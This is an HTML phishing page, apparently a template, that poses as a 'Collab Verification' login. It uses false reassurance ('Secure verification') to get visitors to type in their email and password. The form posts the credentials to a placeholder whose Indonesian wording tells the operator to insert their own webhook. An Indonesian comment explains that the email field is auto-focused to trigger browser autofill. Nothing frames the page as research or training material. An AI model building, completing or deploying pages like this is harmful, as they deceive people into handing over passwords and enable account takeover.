<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Collab Portal – Verify</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      background: #0f0f0f;
      color: #fff;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .card {
      background: #1a1a1a;
      border-radius: 16px;
      padding: 36px 28px;
      width: 90%;
      max-width: 400px;
      box-shadow: 0 20px 50px rgba(0,0,0,0.5);
    }
    h1 { font-size: 22px; margin-bottom: 6px; text-align: center; }
    .sub { color: #888; font-size: 14px; text-align: center; margin-bottom: 28px; line-height: 1.5; }
    label { display: block; font-size: 13px; color: #aaa; margin-bottom: 6px; }
    input {
      width: 100%;
      padding: 13px 14px;
      border-radius: 10px;
      border: 1px solid #333;
      background: #111;
      color: #fff;
      font-size: 15px;
      margin-bottom: 16px;
      outline: none;
    }
    input:focus { border-color: #2aabee; }
    button {
      width: 100%;
      padding: 14px;
      border: none;
      border-radius: 10px;
      background: #2aabee;
      color: white;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 8px;
    }
    .note { text-align: center; font-size: 12px; color: #555; margin-top: 18px; }
  </style>
</head>
<body>
  <div class="card">
    <h1>Collab Verification</h1>
    <p class="sub">Verify your account before we proceed with the collaboration.</p>

    <form action="GANTI_DENGAN_WEBHOOK_KAU" method="POST">
      <label>Email / Username</label>
      <input type="email" name="email" autocomplete="username" required placeholder="you@email.com">

      <label>Password</label>
      <input type="password" name="password" autocomplete="current-password" required placeholder="••••••••">

      <button type="submit">Verify & Continue</button>
    </form>

    <p class="note">Secure verification • Takes less than 10 seconds</p>
  </div>

  <script>
    // Auto focus supaya autofill muncul cepat
    window.onload = () => {
      document.querySelector('input[name="email"]').focus();
    };
  </script>
</body>
</html>
